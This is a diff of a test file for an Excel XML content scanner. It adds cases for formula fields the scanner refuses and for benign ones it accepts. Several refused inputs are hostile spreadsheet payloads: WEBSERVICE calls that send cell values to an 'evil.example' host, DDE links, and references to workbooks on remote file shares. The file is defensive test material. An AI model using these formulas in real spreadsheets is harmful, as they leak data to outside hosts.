@@ -369,6 +369,21 @@ describe('assertSafeXmlContent: formula fields', () => {
       UNSAFE_CONTENT_REASONS.UNSAFE_FORMULA,
     ],
     ['a later oleObject', '<oleObject progId="Package"/>', UNSAFE_CONTENT_REASONS.UNSAFE_PART],
+    [
+      'a later conditional format value object',
+      '<cfvo type="num" val="1"/>',
+      UNSAFE_CONTENT_REASONS.UNSAFE_FORMULA,
+    ],
+    [
+      'a later hyperlink',
+      '<x:hyperlink ref="A1" location="A1"/>',
+      UNSAFE_CONTENT_REASONS.UNSAFE_FORMULA,
+    ],
+    [
+      'a later camera tool in another case',
+      '<CameraTool cellRange="A1"/>',
+      UNSAFE_CONTENT_REASONS.UNSAFE_FORMULA,
+    ],
   ])('refuses %s after markup the strict lexer cannot read', (_label, later, reason) => {
     const xml = worksheetWithCell('<v>1</v>').replace('<c r="A1">', `<c r="A1"t="n">${later}`);
 
@@ -487,6 +502,28 @@ describe('assertSafeXmlContent: the formula allow list', () => {
     ['a question mark in a quoted sheet name', "'a?b'!A1"],
     ['an asterisk in a quoted sheet name', "'a*b'!A1"],
     ['a sum over a quoted external range', "SUM('\\\\evil.example\\s\\[a.xlsx]S'!A1:A9)"],
+    ['a slash in the quoted sheet name of a cell formula', "'Fiyat/Adet' *Adet"],
+    ['a network path workbook without quotes', '\\\\evil.example\\share\\[x.xlsx]S!A1'],
+    ['a drive path workbook without quotes', 'C:\\temp\\[Book1.xlsx]Sheet1!$A$1'],
+    ['a network path name without quotes', '\\\\evil.example\\share\\Book2.xlsx!MyName'],
+    ['a drive path name without quotes', 'C:\\temp\\Book2.xlsx!MyName'],
+    ['a backslash alone', 'A1\\B1'],
+    ['a bracket after a number', 'SUM(1[1]Sheet1!A1)'],
+    ['a bracket after a period', 'SUM(.[1]Sheet1!A1)'],
+    ['a bracket after a backslash', 'SUM(\\[1]Sheet1!A1)'],
+    ['a bracket after a combining mark', '\u0301[1]Sheet1!A1'],
+    ['a name of another workbook', '[1]!x'],
+    ['this workbook before a reference', '[0]!$A$1'],
+    ['this workbook before a sheet', '[0]Sheet1!A1'],
+    ['this workbook before nothing', '[0]!'],
+    ['this workbook before a number', '[0]!1'],
+    ['this workbook before a call outside the list', '[0]!WEBSERVICE("x")'],
+    ['a call of a parenthesised name', '(WEBSERVICE)("http://evil.example/")'],
+    ['a call of a CHOOSE result', 'CHOOSE(1,WEBSERVICE)("http://evil.example/?"&A1)'],
+    ['a call of an IF result', 'IF(TRUE,HYPERLINK)("http://evil.example/","x")'],
+    ['a call of an INDEX result', 'INDEX(A1:A2,1)("x")'],
+    ['a call of a structured reference', 'Table1[Col]("x")'],
+    ['a call of an array constant', '{1,2}("x")'],
   ])('refuses %s', (_label, text) => {
     expectUnsafeFormula(formulaError(text));
   });
@@ -521,6 +558,15 @@ describe('assertSafeXmlContent: the formula allow list', () => {
     ['a call after white space', 'SUM (A1:A2)'],
     ['error values', 'IFERROR(#N/A,#REF!)'],
     ['an array constant', 'SUM({1,2;3,4})'],
+    ['a spill reference', 'SUM(_xlfn.ANCHORARRAY(D2))'],
+    ['an implicit intersection', '_xlfn.SINGLE(A1:A10)'],
+    ['a table name', 'Table1[Fiyat]'],
+    ['a table name that starts with a low line', '_tbl[Col]'],
+    ['a Turkish table name', `${URUNLER}[Fiyat]`],
+    ['a defined name of this workbook', '[0]!SalesRange'],
+    ['a sum over a defined name of this workbook', 'SUM([0]!_Satis)'],
+    ['an intersection of two parenthesised ranges', 'SUM((A1:B2) (B1:C2))'],
+    ['a backslash in a string literal', 'IF(A1="C:\\temp",1,2)'],
   ])('accepts %s', (_label, text) => {
     expect(formulaError(text)).toBeNull();
   });
@@ -649,6 +695,95 @@ function vmlWith(clientData: string): string {
   );
 }
 
+const PIVOT_CACHE_PART = 'xl/pivotCache/pivotCacheDefinition1.xml';
+const PIVOT_TABLE_PART = 'xl/pivotTables/pivotTable1.xml';
+const CHART_PART = 'xl/charts/chart1.xml';
+const CHART_NS = 'http://schemas.openxmlformats.org/drawingml/2006/chart';
+const OMML_NS = 'http://schemas.openxmlformats.org/officeDocument/2006/math';
+// An Office Math fraction a/b, as Excel writes an equation; `m` must name OMML_NS.
+const OMML_FRACTION =
+  '<m:oMath><m:f><m:fPr><m:ctrlPr/></m:fPr><m:num><m:r><m:t>a</m:t></m:r></m:num>' +
+  '<m:den><m:r><m:t>b</m:t></m:r></m:den></m:f></m:oMath>';
+
+/** A pivot cache definition whose cache fields are `fields`. */
+function pivotCacheWith(fields: string): string {
+  return (
+    `${UTF8_DECLARATION}<pivotCacheDefinition xmlns="${SPREADSHEET_NS}" refreshOnLoad="0">` +
+    `<cacheFields count="1">${fields}</cacheFields></pivotCacheDefinition>`
+  );
+}
+
+/** A pivot table definition whose calculated items are `items`. */
+function pivotTableWith(items: string): string {
+  return (
+    `${UTF8_DECLARATION}<pivotTableDefinition xmlns="${SPREADSHEET_NS}" name="P" cacheId="1">` +
+    `<calculatedItems count="1">${items}</calculatedItems></pivotTableDefinition>`
+  );
+}
+
+type LabelledXml = readonly [label: string, xml: string];
+
+// The content of an x14 data validation formula1 that is not one f holding text only.
+const X14_FORMULA1_REFUSALS: readonly LabelledXml[] = [
+  ['calling WEBSERVICE', `<xm:f>${EVIL_CALL}</xm:f>`],
+  ['holding an element other than f', '<xm:g>Sheet2!$A$1</xm:g>'],
+  ['holding two f elements', '<xm:f>A1</xm:f><xm:f>A2</xm:f>'],
+  ['holding text before its f', 'A1<xm:f>A2</xm:f>'],
+  ['holding text after its f', '<xm:f>A2</xm:f>B1'],
+  ['holding a comment beside its f', '<!--c--><xm:f>A2</xm:f>'],
+  ['whose f holds a comment', '<xm:f>A1<!--c--></xm:f>'],
+  ['whose f holds an element', '<xm:f><xm:f>A1</xm:f></xm:f>'],
+  ['whose f is empty', '<xm:f/>'],
+  ['whose f assigns a macro', '<xm:f macro="m">A1</xm:f>'],
+  ['whose f is closed by another end tag', '<xm:f>A1</xm:g>'],
+];
+
+// Pivot calculated field formulas (XML attribute text) the field-name reading still refuses.
+const PIVOT_FIELD_REFUSALS: readonly LabelledXml[] = [
+  ['calling WEBSERVICE after a quoted field name', `'Fiyat/Adet'*${EVIL_CALL}`],
+  ['holding a format character in a quoted field name', "'Fiyat&#x200B;Adet'*2"],
+  ['holding a quoted field name that never closes', "'Fiyat/Adet*2"],
+];
+
+// Worksheet content after the sheet data whose `m:f` is a formula field: its prefix does
+// not name the OMML namespace where it stands, or the walk cannot tell.
+const OMML_FIELD_REFUSALS: readonly LabelledXml[] = [
+  ['in another namespace, holding elements', '<m:f xmlns:m="urn:not-math"><m:num/></m:f>'],
+  [
+    'whose OMML prefix only a closed sibling bound',
+    `<a xmlns:m="${OMML_NS}"/><m:f>${EVIL_CALL}</m:f>`,
+  ],
+  [
+    'whose prefix an inner element binds again',
+    `<a xmlns:m="${OMML_NS}"><b xmlns:m="urn:x"><m:f>${EVIL_CALL}</m:f></b></a>`,
+  ],
+  [
+    'after the element binding OMML closed',
+    `<a xmlns:m="${OMML_NS}">${OMML_FRACTION}</a><m:f>${EVIL_CALL}</m:f>`,
+  ],
+  [
+    'past an end tag that closes another element',
+    `<a xmlns:m="${OMML_NS}"><b></a><m:f>${EVIL_CALL}</m:f></b>`,
+  ],
+  [
+    'whose prefix one element declares twice, once not OMML',
+    `<a xmlns:m="${SPREADSHEET_NS}" xmlns:m="${OMML_NS}"><m:f>${EVIL_CALL}</m:f></a>`,
+  ],
+  [
+    'whose OMML namespace is written with a reference',
+    `<a xmlns:m="&#104;${OMML_NS.slice(1)}"><m:f>${EVIL_CALL}</m:f></a>`,
+  ],
+];
+
+/** A line chart whose one series reads its values from the formula `formula` (XML text). */
+function chartWithSeries(formula: string): string {
+  return (
+    `${UTF8_DECLARATION}<c:chartSpace xmlns:c="${CHART_NS}"><c:chart><c:plotArea><c:lineChart>` +
+    `<c:ser><c:idx val="0"/><c:order val="0"/><c:val><c:numRef><c:f>${formula}</c:f></c:numRef></c:val></c:ser>` +
+    '</c:lineChart></c:plotArea></c:chart></c:chartSpace>'
+  );
+}
+
 // Every field Excel evaluates as a formula, in every XML part whatever its root and path.
 describe('assertSafeXmlContent: formula fields in every part', () => {
   it.each<[label: string, entry: string, xml: string]>([
@@ -685,11 +820,60 @@ describe('assertSafeXmlContent: formula fields in every part', () => {
         `<dataValidations count="1"><dataValidation type="whole" sqref="A1"><formula1>1</formula1><formula2>LEN(${EVIL_CALL})</formula2></dataValidation></dataValidations>`,
       ),
     ],
-    [
-      'an x14 data validation formula1 holding an element',
+    ...X14_FORMULA1_REFUSALS.map(([label, content]): [string, string, string] => [
+      `an x14 data validation formula1 ${label}`,
       SHEET_PART,
       worksheetWithAfter(
-        '<x14:dataValidation xmlns:x14="urn:x14" xmlns:xm="urn:xm"><x14:formula1><xm:f>Sheet2!$A$1:$A$5</xm:f></x14:formula1></x14:dataValidation>',
+        `<x14:dataValidation xmlns:x14="urn:x14" xmlns:xm="urn:xm"><x14:formula1>${content}</x14:formula1></x14:dataValidation>`,
+      ),
+    ]),
+    [
+      'an x14 data validation formula1 closed by another end tag',
+      SHEET_PART,
+      worksheetWithAfter(
+        '<x14:dataValidation xmlns:x14="urn:x14" xmlns:xm="urn:xm"><x14:formula1><xm:f>A1</xm:f></x14:formula2></x14:dataValidation>',
+      ),
+    ],
+    [
+      'a colour scale value object calling WEBSERVICE',
+      SHEET_PART,
+      worksheetWithAfter(
+        `<conditionalFormatting sqref="A1:A10"><cfRule type="colorScale" priority="1"><colorScale><cfvo type="formula" val="${EVIL_CALL}"/><cfvo type="max"/><color rgb="FFF8696B"/><color rgb="FF63BE7B"/></colorScale></cfRule></conditionalFormatting>`,
+      ),
+    ],
+    [
+      'a data bar value object of type num calling WEBSERVICE',
+      SHEET_PART,
+      worksheetWithAfter(
+        `<conditionalFormatting sqref="A1:A10"><cfRule type="dataBar" priority="1"><dataBar><cfvo type="num" val="${EVIL_CALL}"/><cfvo type="max"/><color rgb="FF638EC6"/></dataBar></cfRule></conditionalFormatting>`,
+      ),
+    ],
+    [
+      'an icon set value object holding a DDE link',
+      SHEET_PART,
+      worksheetWithAfter(
+        `<conditionalFormatting sqref="A1:A10"><cfRule type="iconSet" priority="1"><iconSet><cfvo type="percent" val="0"/><x14:cfvo xmlns:x14="urn:x14" type="formula" val="${DDE_LINK}"/></iconSet></cfRule></conditionalFormatting>`,
+      ),
+    ],
+    [
+      'a hyperlink location calling WEBSERVICE',
+      SHEET_PART,
+      worksheetWithAfter(
+        `<hyperlinks><hyperlink ref="A1" location="${EVIL_CALL}" display="Detay"/></hyperlinks>`,
+      ),
+    ],
+    [
+      'a hyperlink location into a workbook on a file share',
+      SHEET_PART,
+      worksheetWithAfter(
+        `<hyperlinks><hyperlink ref="A1" location="'\\\\evil.example\\s\\[x.xlsx]S'!A1"/></hyperlinks>`,
+      ),
+    ],
+    [
+      'a camera tool range calling WEBSERVICE',
+      DRAWING_PART,
+      drawingWith(
+        `<xdr:pic macro=""><xdr:nvPicPr><xdr:cNvPr id="2" name="p"><a:extLst xmlns:a="urn:a"><a:ext uri="{84589F7E-364E-4C9E-8A38-B11213B215E9}"><a14:cameraTool xmlns:a14="urn:a14" cellRange="${EVIL_CALL}" spid="_x0000_s1025"/></a:ext></a:extLst></xdr:cNvPr></xdr:nvPicPr></xdr:pic>`,
       ),
     ],
     [
@@ -726,6 +910,33 @@ describe('assertSafeXmlContent: formula fields in every part', () => {
       'xl/pivotCache/pivotCacheDefinition1.xml',
       `${UTF8_DECLARATION}<pivotCacheDefinition xmlns="${SPREADSHEET_NS}" refreshOnLoad="1"><cacheFields count="1"><cacheField name="x" formula="${EVIL_CALL}" databaseField="0"/></cacheFields></pivotCacheDefinition>`,
     ],
+    ...PIVOT_FIELD_REFUSALS.map(([label, formula]): [string, string, string] => [
+      `a pivot cache calculated field ${label}`,
+      PIVOT_CACHE_PART,
+      pivotCacheWith(`<cacheField name="Toplam" formula="${formula}" databaseField="0"/>`),
+    ]),
+    [
+      'a pivot calculated item calling WEBSERVICE',
+      PIVOT_TABLE_PART,
+      pivotTableWith(
+        `<calculatedItem formula="'Q1/Q2'*${EVIL_CALL}"><pivotArea/></calculatedItem>`,
+      ),
+    ],
+    [
+      'a quoted path in the text link of a pivot cache field',
+      PIVOT_CACHE_PART,
+      pivotCacheWith(`<cacheField name="x" link="'C:\\x\\[a.xlsx]S'!A1"/>`),
+    ],
+    [
+      'a chart series bound to a name of another workbook',
+      CHART_PART,
+      chartWithSeries('[1]!SalesRange'),
+    ],
+    ...OMML_FIELD_REFUSALS.map(([label, after]): [string, string, string] => [
+      `an f ${label}`,
+      SHEET_PART,
+      worksheetWithAfter(after),
+    ]),
     [
       'a shape text link calling WEBSERVICE',
       DRAWING_PART,
@@ -847,6 +1058,94 @@ describe('assertSafeXmlContent: formula fields in every part', () => {
       'VML formulas of a shape type',
       VML_PART,
       `<xml ${VML_NAMESPACES}><v:shapetype id="_x0000_t202"><v:formulas><v:f eqn="if lineDrawn pixelLineWidth 0"/></v:formulas></v:shapetype></xml>`,
+    ],
+    [
+      'an x14 data validation list from another sheet',
+      SHEET_PART,
+      worksheetWithAfter(
+        '<x14:dataValidation xmlns:x14="urn:x14" xmlns:xm="urn:xm"><x14:formula1><xm:f>Sheet2!$A$1:$A$5</xm:f></x14:formula1></x14:dataValidation>',
+      ),
+    ],
+    [
+      'x14 data validation formulas with white space around their f',
+      SHEET_PART,
+      worksheetWithAfter(
+        '<x14:dataValidation xmlns:x14="urn:x14" xmlns:xm="urn:xm" type="whole">' +
+          '<x14:formula1>\n  <xm:f>Lists!$A$2</xm:f>\n</x14:formula1>' +
+          '<x14:formula2> <xm:f xmlns:xm="urn:xm">Lists!$A$3</xm:f> </x14:formula2></x14:dataValidation>',
+      ),
+    ],
+    [
+      'the x14 data validation list Excel 2010+ writes',
+      SHEET_PART,
+      worksheetWithAfter(
+        '<extLst><ext xmlns:x14="http://schemas.microsoft.com/office/spreadsheetml/2009/9/main" uri="{CCE6A557-97BC-4b89-ADB6-D9C93CAAB3DF}">' +
+          '<x14:dataValidations xmlns:xm="http://schemas.microsoft.com/office/excel/2006/main" count="1">' +
+          '<x14:dataValidation type="list" allowBlank="1" showInputMessage="1" showErrorMessage="1">' +
+          '<x14:formula1><xm:f>Listeler!$A$2:$A$20</xm:f></x14:formula1><xm:sqref>B2:B500</xm:sqref>' +
+          '</x14:dataValidation></x14:dataValidations></ext></extLst>',
+      ),
+    ],
+    [
+      'conditional format value objects of every type',
+      SHEET_PART,
+      worksheetWithAfter(
+        '<conditionalFormatting sqref="A1:A10"><cfRule type="iconSet" priority="1"><iconSet>' +
+          '<cfvo type="num" val="-1.5E+3"/><cfvo type="percent" val="50"/><cfvo type="percentile" val="90"/>' +
+          '<cfvo type="formula" val="$A$1"/><cfvo type="formula" val="Sheet2!$B$1*2"/><cfvo type="min"/><cfvo type="max" val=""/>' +
+          '</iconSet></cfRule></conditionalFormatting>',
+      ),
+    ],
+    [
+      'hyperlink locations to a quoted sheet, a cell and a defined name',
+      SHEET_PART,
+      worksheetWithAfter(
+        `<hyperlinks><hyperlink ref="A1" location="'Sheet 2'!A1" display="x"/><hyperlink ref="A2" location="'${URUNLER}'!B2"/>` +
+          '<hyperlink ref="A3" location="C5"/><hyperlink ref="A4" location="MyName"/><hyperlink ref="A5" r:id="rId1"/></hyperlinks>',
+      ),
+    ],
+    [
+      'a camera tool range',
+      DRAWING_PART,
+      drawingWith(
+        '<xdr:pic macro=""><xdr:nvPicPr><xdr:cNvPr id="2" name="p"><a14:cameraTool xmlns:a14="urn:a14" cellRange="Sheet1!$A$1:$B$2" spid="_x0000_s1025"/></xdr:cNvPr></xdr:nvPicPr></xdr:pic>',
+      ),
+    ],
+    [
+      'a pivot calculated field whose quoted field name holds a slash',
+      PIVOT_CACHE_PART,
+      pivotCacheWith(
+        `<cacheField name="Fiyat/Adet" numFmtId="0"/><cacheField name="Adet" numFmtId="0"/><cacheField name="Toplam" numFmtId="0" formula="'Fiyat/Adet' *Adet" databaseField="0"/>`,
+      ),
+    ],
+    [
+      'a pivot calculated item whose quoted field names hold a slash and a bracket',
+      PIVOT_TABLE_PART,
+      pivotTableWith(`<calculatedItem formula="'Q1/Q2'*2+'[Kalan]'"><pivotArea/></calculatedItem>`),
+    ],
+    [
+      'a chart series bound to a defined name of this workbook',
+      CHART_PART,
+      chartWithSeries('[0]!SalesRange'),
+    ],
+    [
+      'an Office Math fraction in a drawing text box, the prefix bound on the root',
+      DRAWING_PART,
+      `${UTF8_DECLARATION}<xdr:wsDr xmlns:xdr="${DRAWING_NS}" xmlns:a="urn:a" xmlns:m="${OMML_NS}">` +
+        '<xdr:twoCellAnchor><xdr:sp macro="" textlink=""><xdr:txBody><a:p><a14:m xmlns:a14="urn:a14">' +
+        `<m:oMathPara>${OMML_FRACTION}</m:oMathPara></a14:m></a:p></xdr:txBody></xdr:sp></xdr:twoCellAnchor></xdr:wsDr>`,
+    ],
+    [
+      'an Office Math fraction whose prefix an ancestor binds',
+      DRAWING_PART,
+      drawingWith(
+        `<xdr:sp macro="" textlink=""><a14:m xmlns:a14="urn:a14"><m:oMathPara xmlns:m="${OMML_NS}">${OMML_FRACTION}${OMML_FRACTION}</m:oMathPara></a14:m></xdr:sp>`,
+      ),
+    ],
+    [
+      'an Office Math fraction in the OMML default namespace',
+      DRAWING_PART,
+      drawingWith(`<oMath xmlns="${OMML_NS}"><f><fPr/><num/><den/></f></oMath>`),
     ],
   ])('accepts %s', (_label, entry, xml) => {
     expect(scanError(entriesOf({ [entry]: xml }))).toBeNull();
